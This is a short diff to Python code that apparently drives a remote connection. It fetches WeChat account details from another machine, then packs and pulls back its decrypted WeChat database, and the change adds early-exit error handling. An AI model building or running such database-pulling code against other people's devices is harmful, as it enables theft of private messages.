@@ -152,10 +152,15 @@ def get_wechat_info(conn):
     print('[*] 正在获取微信信息...')
     wx_info = (conn.recv(1024).decode('UTF-8'))
     print(wx_info)
+    if str(wx_info).startswith('[-]'):
+        return None
+    return wx_info
 
 
 def get_wechat(conn):
-    get_wechat_info(conn)
+    rev = get_wechat_info(conn)
+    if rev is None:
+        return
     print('[*] 正在打包拉取微信数据库...')
     conn.send(remote_decrypted_path.encode('UTF-8'))
     get_file(conn)
